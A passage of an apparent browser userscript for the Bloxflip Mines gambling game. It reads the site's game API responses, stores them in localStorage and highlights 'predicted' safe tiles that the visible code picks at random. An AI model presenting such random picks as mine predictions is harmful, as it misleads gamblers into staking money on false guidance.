            if (!safeTiles.includes(randomTile)) {
                safeTiles.push(randomTile);
            }
        }

        return safeTiles;
    }

    function handleResponseData(url, data) {
        const mainGUI = document.querySelector('.mainGUI');
        try {
            console.log(`Handling response data for URL: ${url}`);
            if (url.includes('https://api.bloxflip.com/games/mines/create')) {
                if (data.success && data.game && data.game.uuid) {
                    currentGameId = data.game.uuid;
                    console.log('Game created:', data);
                    storeData('gameCreateMines', data);
                    const animation = showLoadingAnimation(mainGUI);
                    window.loadingAnimation = animation;

                    const tileInput = document.querySelector('.utilitiesGui input[type="number"]');
                    if (tileInput) {
                        const tileAmount = parseInt(tileInput.value, 10);
                        illuminatePredictedMines(tileAmount);
                    }
                }
            } else if (url.includes('https://api.bloxflip.com/games/mines/action')) {
                console.log('Game action:', data);
                storeData('gameActionMines', data);
                if (data.exploded || data.winnings !== undefined) {
                    if (data.exploded) {
                        storeData('mineLose', data);
                    } else if (data.winnings !== undefined) {
                        storeData('gameCashoutMines', data);
                    }
                    hideLoadingAnimation(mainGUI);
                }
            }
        } catch (error) {
            console.error('Error handling response data:', error);
        }
    }

    function storeData(key, data) {
        try {
            let storedData = JSON.parse(localStorage.getItem(key)) || [];
            if (Array.isArray(storedData)) {
                storedData.push(data);
            } else {
                storedData = [data];
            }
            localStorage.setItem(key, JSON.stringify(storedData));
            console.log(`Data stored under key "${key}":`, storedData);
        } catch (error) {
            console.error('Error storing data:', error);
        }
    }

    function observeLocalStorage() {
        window.addEventListener('storage', (event) => {
            const mainGUI = document.querySelector('.mainGUI');
            if (event.key === 'gameCreateMines') {
                const data = JSON.parse(event.newValue);
                if (data && data.length > previousGameCreateMinesLength) {
                    handleGameCreate(data[data.length - 1]);
                    const animation = showLoadingAnimation(mainGUI);
                    window.loadingAnimation = animation;
                    previousGameCreateMinesLength = data.length;
                }
            } else if (event.key === 'mineLose' || event.key === 'gameCashoutMines') {
                hideLoadingAnimation(mainGUI);
            }
        });
    }

    observeLocalStorage();

    document.addEventListener('DOMContentLoaded', () => {
        initialize();
    });
})();
